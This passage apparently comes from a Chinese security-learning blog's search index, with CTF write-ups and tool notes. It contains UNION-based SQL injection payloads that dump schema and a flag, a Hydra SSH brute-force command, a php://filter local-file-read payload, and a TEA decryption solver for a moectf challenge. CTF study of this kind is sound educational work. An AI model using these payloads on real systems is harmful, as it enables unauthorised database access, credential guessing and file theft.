class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test_db&#x27;</span><span class="hljs-comment">--+</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200638.png"><br><img src="http://gitee.com/fogpost/photo/raw/master/20240912200811.png"><br>æœ€åä»è¡¨ä¸­æŸ¥è¯¢flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,flag from test_tb --+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200912.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å·¥å…·ä½¿ç”¨è¯´æ˜ä¹¦</title>
    <link href="/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="å·¥å…·ä½¿ç”¨è¯´æ˜ä¹¦"><a href="#å·¥å…·ä½¿ç”¨è¯´æ˜ä¹¦" class="headerlink" title="å·¥å…·ä½¿ç”¨è¯´æ˜ä¹¦"></a>å·¥å…·ä½¿ç”¨è¯´æ˜ä¹¦</h1><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>hydra -l root -p root 127.0.0.1 -s 2111 ssh -f<br>-lï¼š LOGIN      æŒ‡å®šç ´è§£çš„ç”¨æˆ·ï¼Œå¯¹ç‰¹å®šç”¨æˆ·ç ´è§£ã€‚<br>-Lï¼šFILE     æŒ‡å®šç”¨æˆ·åå­—å…¸ã€‚<br>-pï¼šPASS ï¼ŒæŒ‡å®šå¯†ç ç ´è§£ï¼Œå°‘ç”¨ï¼Œä¸€èˆ¬æ˜¯é‡‡ç”¨å¯†ç å­—å…¸ã€‚<br>-Pï¼š FILE   æŒ‡å®šå¯†ç å­—å…¸æ–‡ä»¶<br>-sï¼š PORT æŒ‡å®šçˆ†ç ´ç«¯å£<br>-Mï¼šFILE    æŒ‡å®šç›®æ ‡åˆ—è¡¨æ–‡ä»¶<br>-Cï¼š FILE   ä½¿ç”¨å†’å·åˆ†å‰²æ ¼å¼ï¼Œä¾‹å¦‚â€œç™»å½•å : å¯†ç â€æ¥ä»£æ›¿-L&#x2F;-På‚æ•°ã€‚<br>-fï¼š  åœ¨ä½¿ç”¨-Må‚æ•°ä»¥åï¼Œæ‰¾åˆ°ç¬¬ä¸€å¯¹ç™»å½•åæˆ–è€…å¯†ç çš„æ—¶å€™ä¸­æ­¢ç ´è§£</p><blockquote><p>ps:æˆ‘ä»¬å¯ä»¥åˆ©ç”¨hydra -hæ¥æŸ¥çœ‹å¸®åŠ©</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è„šæœ¬å‘½ä»¤å’Œæ™®é€šå‘½ä»¤çš„åŒºåˆ«</title>
    <link href="/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/"/>
    <url>/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/</url>
    
    <content type="html"><![CDATA[<h3 id="è„šæœ¬å‘½ä»¤å’Œæ™®é€šå‘½ä»¤çš„åŒºåˆ«"><a href="#è„šæœ¬å‘½ä»¤å’Œæ™®é€šå‘½ä»¤çš„åŒºåˆ«" class="headerlink" title="è„šæœ¬å‘½ä»¤å’Œæ™®é€šå‘½ä»¤çš„åŒºåˆ«"></a>è„šæœ¬å‘½ä»¤å’Œæ™®é€šå‘½ä»¤çš„åŒºåˆ«</h3><blockquote><p>åœ¨æˆ‘ä»¬å°†windowsç³»ç»Ÿè°ƒæˆå¯ä»¥æ‰§è¡Œè„šæœ¬å‘½ä»¤ä¹‹åæˆ‘ä»¬çš„è®¸å¤šå‘½ä»¤åœ¨cmdæˆ–iseä¸­å¯èƒ½æ— æ³•æ‰§è¡Œè¿™å¯èƒ½æ˜¯å› ä¸ºå‘½åçš„åŸå›    </p></blockquote><p>å¼€å¯è„šæœ¬æ‰§è¡Œä¹‹å‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\agesh&gt; where calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><p>å¼€å¯ä¹‹å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\data\code&gt; where calc<br>PS C:\data\code&gt;<br></code></pre></td></tr></table></figure><p>è§£å†³åŠæ³•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where.exe calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><h4 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where  [cc lang=&quot;powershell&quot;]<br>cmdlet Where-Object at command pipeline position 1<br>Supply values for the following parameters:<br>Property:<br></code></pre></td></tr></table></figure><blockquote><p>æ‰€ä»¥åœ¨å†™å…¥where calcæ—¶æ‰§è¡Œçš„å…¶å®æ˜¯where-object caclè¿™æ˜¯æ²¡æœ‰è¿”å›å€¼çš„ï¼Œä¸æ˜¯æ‰§è¡Œwhere.exe calc<br>ä½†æ˜¯åœ¨éè„šæœ¬åæ¨¡å¼ä¸‹ä¸ä¼šè¯†åˆ«ä½where-objectäºæ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œ</p></blockquote><p><a href="https://www.codenong.com/16775686/">ç›¸å…³é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>script</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpä¼ªåè®®</title>
    <link href="/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>#phpä¼ªåè®®<br>phpä¼ªåè®®<br>å¸¸è§çš„phpä¼ªåè®®</p><p>1ï¼‰file:&#x2F;&#x2F; è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</p><p>2ï¼‰http:&#x2F;&#x2F; è®¿é—®HTTP(S)ç½‘å€</p><p>3ï¼‰ftp:&#x2F;&#x2F; è®¿é—®FTP(S)URL</p><p>4)php:&#x2F;&#x2F; è®¿é—®å„ä¸ªè¾“å‡ºè¾“å…¥æµ</p><p>5)zlib:&#x2F;&#x2F; å¤„ç†å‹ç¼©æµ</p><p>6)data:&#x2F;&#x2F; è¯»å–æ•°æ®</p><p>7)glob:&#x2F;&#x2F; æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</p><p>8)phar:&#x2F;&#x2F; PHPå½’æ¡£</p><p>9)rar:&#x2F;&#x2F; RARæ•°æ®å‹ç¼©</p><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php æ˜¯ä¸€ç§åˆ©ç”¨ PHP æµå°è£…å™¨ (php:&#x2F;&#x2F;filter) çš„æ–¹å¼ï¼Œå¸¸ç”¨äºæ¼æ´åˆ©ç”¨ä¸­ï¼Œç‰¹åˆ«æ˜¯åœ¨æ–‡ä»¶åŒ…å«æˆ–æ–‡ä»¶è¯»å–çš„æ”»å‡»åœºæ™¯ä¸­ã€‚è®©æˆ‘ä»¬é€æ­¥åˆ†æå…¶å«ä¹‰ï¼š</p><p>åˆ†è§£è¯´æ˜ï¼š<br>php:&#x2F;&#x2F;filterï¼š</p><p>php:&#x2F;&#x2F; æ˜¯ PHP çš„ä¸€ç§æµå°è£…åè®®ï¼Œå®ƒå…è®¸ç›´æ¥è¯»å–æˆ–å†™å…¥è¾“å…¥ã€è¾“å‡ºã€é”™è¯¯æµä»¥åŠå…¶ä»–ç‰¹æ®Šèµ„æºã€‚<br>filter æ˜¯ä¸€ç§æµè¿‡æ»¤å™¨ï¼Œå…è®¸å¯¹æµè¿›è¡Œç‰¹å®šçš„æ“ä½œï¼Œå¦‚ç¼–ç ã€è§£ç ã€å‹ç¼©ã€åŠ å¯†ç­‰ã€‚<br>convert.base64-encodeï¼š</p><p>è¿™æ˜¯æµè¿‡æ»¤å™¨çš„ä¸€ä¸ªè½¬æ¢æ“ä½œï¼Œå®ƒä¼šå°†æ–‡ä»¶å†…å®¹è¿›è¡Œ Base64 ç¼–ç ã€‚Base64 æ˜¯ä¸€ç§å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸º ASCII å­—ç¬¦çš„ç¼–ç æ–¹å¼ï¼Œå¸¸ç”¨äºç½‘ç»œä¼ è¾“ã€‚<br>convert.base64-encode æŒ‡å®šè¦å¯¹ç›®æ ‡æ–‡ä»¶å†…å®¹è¿›è¡Œ Base64 ç¼–ç ã€‚<br>resource&#x3D;flag.phpï¼š</p><p>resource æŒ‡å®šäº†ä½ è¦æ“ä½œçš„æ–‡ä»¶èµ„æºã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œflag.php æ˜¯ç›®æ ‡æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªåŒ…å«æ•æ„Ÿä¿¡æ¯æˆ–æ ‡å¿—çš„æ–‡ä»¶ï¼Œå¯èƒ½ä¸å…è®¸ç›´æ¥é€šè¿‡æµè§ˆå™¨è®¿é—®ã€‚<br>é€šè¿‡æµå°è£…å™¨ï¼ŒPHP ä¼šè¯»å– flag.php çš„å†…å®¹ï¼Œå¹¶åœ¨æµæ“ä½œä¸­å°†å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚<br>æ•´ä½“åŠŸèƒ½ï¼š<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php çš„ä½œç”¨æ˜¯ï¼š</p><p>è¯»å– flag.php æ–‡ä»¶çš„å†…å®¹ã€‚<br>ä½¿ç”¨ Base64 ç¼–ç å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œç¼–ç ã€‚<br>è¿”å›ç¼–ç åçš„æ–‡ä»¶å†…å®¹ï¼Œè€Œä¸æ˜¯ç›´æ¥è¿”å›åŸå§‹å†…å®¹ã€‚<br>å…¸å‹çš„åˆ©ç”¨åœºæ™¯ï¼š<br>è¿™é€šå¸¸ç”¨äº æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´ã€‚åœ¨å­˜åœ¨ LFI æ¼æ´çš„ç³»ç»Ÿä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ PHP çš„ includeã€requireã€file_get_contents ç­‰å‡½æ•°è¯»å–ä»»æ„æ–‡ä»¶ï¼Œä½†æœ‰æ—¶æ–‡ä»¶åŒ…å«è¢«é™åˆ¶æˆ–æ•æ„Ÿæ–‡ä»¶çš„å†…å®¹ä¸å¯è§ã€‚</p><p>é€šè¿‡ php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phpï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡æŸäº›é™åˆ¶ï¼Œè¯»å–æ–‡ä»¶å¹¶è·å–å…¶ Base64 ç¼–ç å†…å®¹ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥æ‰‹åŠ¨å°† Base64 å†…å®¹è§£ç ï¼ŒæŸ¥çœ‹æ–‡ä»¶çš„åŸå§‹å†…å®¹ã€‚</p><h1 id="include-once-file"><a href="#include-once-file" class="headerlink" title="include_once($file)"></a>include_once($file)</h1><h3 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h3><ul><li>å¦‚æœæ–‡ä»¶æˆåŠŸåŒ…å«ï¼Œinclude_once å°†ä¼šè¿”å› 1</li><li>å¦‚æœæ–‡ä»¶æ²¡æœ‰è¢«æ‰¾åˆ°æˆ–è€…åœ¨å°è¯•åŒ…å«æ–‡ä»¶è¿‡ç¨‹ä¸­æœ‰é”™è¯¯ï¼Œinclude_once ä¸ä¼šè¿”å›ä»»ä½•å€¼ï¼Œä½†ä¼šäº§ç”Ÿä¸€ä¸ªè­¦å‘Šï¼ˆé™¤é error_reporting è¢«è®¾ç½®æˆå¿½ç•¥è­¦å‘Šï¼‰ã€‚</li></ul><h3 id="å„ç±»æ–‡ä»¶ç±»å‹çš„è¾“å‡ºæƒ…å†µ"><a href="#å„ç±»æ–‡ä»¶ç±»å‹çš„è¾“å‡ºæƒ…å†µ" class="headerlink" title="å„ç±»æ–‡ä»¶ç±»å‹çš„è¾“å‡ºæƒ…å†µ"></a>å„ç±»æ–‡ä»¶ç±»å‹çš„è¾“å‡ºæƒ…å†µ</h3><p>include_once çš„å‚æ•°ä¸æ˜¯ä¸€ä¸ª PHP æ–‡ä»¶ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶çš„å†…å®¹ä¼šè¢«ç›´æ¥è¾“å‡ºï¼ˆæˆ–æ‰§è¡Œï¼Œå¦‚æœæœ‰å¯æ‰§è¡Œçš„ PHP ä»£ç ï¼‰åˆ°è¾“å‡ºæµä¸­ã€‚å…·ä½“çš„è¡Œä¸ºå–å†³äºè¯¥æ–‡ä»¶çš„å†…å®¹å’Œç±»å‹ã€‚  </p><ol><li><strong>çº¯æ–‡æœ¬æ–‡ä»¶ï¼ˆæ¯”å¦‚ .txtï¼‰</strong>: æ–‡ä»¶çš„å†…å®¹ä¼šè¢«ç›´æ¥è¾“å‡ºã€‚</li><li><strong>HTML æ–‡ä»¶ï¼ˆæ¯”å¦‚ .html æˆ– .htmï¼‰</strong>: HTML ä»£ç ä¼šè¢«ç›´æ¥è¾“å‡ºï¼Œæµè§ˆå™¨ä¼šæŒ‰ç…§ HTML æ¥æ¸²æŸ“ã€‚</li><li><strong>XML æ–‡ä»¶æˆ–å…¶ä»–æ ‡è®°è¯­è¨€æ–‡ä»¶</strong>: æ–‡ä»¶çš„å†…å®¹ä¼šè¢«ç›´æ¥è¾“å‡ºã€‚</li><li><strong>äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæ¯”å¦‚å›¾ç‰‡æˆ–è€…éŸ³é¢‘æ–‡ä»¶ï¼‰</strong>: è¿™æ ·åšé€šå¸¸ä¸æ˜¯ä¸ªå¥½ä¸»æ„ï¼Œå› ä¸ºäºŒè¿›åˆ¶æ•°æ®å¯èƒ½ä¼šè¢«é”™è¯¯åœ°è§£é‡Šä¸ºæ–‡æœ¬ï¼Œå¯¼è‡´è¾“å‡ºä¹±ç æˆ–äº§ç”Ÿä¸å¯é¢„æµ‹çš„ç»“æœã€‚</li><li><strong>åŒ…å« PHP ä»£ç çš„é PHP æ–‡ä»¶</strong>: å¦‚æœæ–‡ä»¶ä¸­æ··åˆæœ‰ PHP ä»£ç ï¼ˆå³ä½¿æ–‡ä»¶æ‰©å±•åä¸æ˜¯ .phpï¼‰ï¼Œé‚£ä¹ˆé‚£éƒ¨åˆ† PHP ä»£ç ä»ç„¶ä¼šè¢«æ‰§è¡Œã€‚</li></ol>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tea.dm</title>
    <link href="/2024/09/10/tea/"/>
    <url>/2024/09/10/tea/</url>
    
    <content type="html"><![CDATA[<h1 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h1><p>ç»ˆäºè‡ªå·±åšå‡ºä¸€é“teaäº†ä¹<br>çœ‹åŸé¢˜<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122053979.png"><br>&emsp;å…¸å‹çš„teaç›´æ¥å¥—æ¨¡æ¿ï¼Œä½†æ˜¯æœ‰é—®é¢˜ï¼Œå°±æ˜¯pyä¸­ä¸ä¼šé™å®šä¸º32ä½æ‰€ä»¥æœ€åçš„ç­”æ¡ˆä¼šè¶…çº§å¤§ï¼Œæˆ‘ä»¬å°±è¦å»è¿›è¡Œä¸€ä¸ª&amp;ffffffffçš„æ“ä½œä½¿æ•°å€¼æ­£ç¡®<br>&emsp;ç„¶åå°±æ˜¯å…³äºé¢˜ç›®ä¸­çš„å°é—®é¢˜ï¼Œé¦–å…ˆå°±æ˜¯deltaï¼Œæ ‡å‡†çš„teaæ˜¯0x9E3779B9ï¼Œä½†æ˜¯åœ¨idaä¸­æ€»æ˜¯ä¼šå‡ºç°å˜æˆ-0x61c88647çš„é—®é¢˜éœ€è¦æ³¨æ„ï¼Œç„¶åå°±æ˜¯æœ€åçš„v5æ€ä¹ˆæ±‚,å°±æ˜¯ä¸€ä¸ªåç§»ç›¸åŠ ï¼Œåœ¨expä¸­æœ‰äº†</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v0, v1</span>):<br>    delta = <span class="hljs-number">0x9E3779B9</span><br>    v3 = delta * <span class="hljs-number">32</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v1 = (v1 - ((v0 + v3) ^ (<span class="hljs-number">16</span> * v0 + <span class="hljs-number">1634038898</span>) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1634038904</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 = (v0 - ((v1 + v3) ^ (<span class="hljs-number">16</span> * v1 + <span class="hljs-number">1702060386</span>) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1870148662</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v3 = (v3 - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v0, v1<br><span class="hljs-comment">#å·²çŸ¥çš„åŠ å¯†ç»“æœ</span><br>v4 = <span class="hljs-number">676078132</span><br>v5 = <span class="hljs-number">957400408</span><br><span class="hljs-comment">#è§£å¯†</span><br>v10, v11 = decrypt(v4, v5)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted v10: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v10)&#125;</span>, v11: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v11)&#125;</span>&quot;</span>)<br>i=<span class="hljs-number">0x49BD</span><br>j=<span class="hljs-number">0x8e00</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(j)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(i|(j&lt;&lt;<span class="hljs-number">16</span>)))<br><span class="hljs-comment">#moectf&#123;836153a5-8e00-49bd-9c42-caf30620caaf&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>decode</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
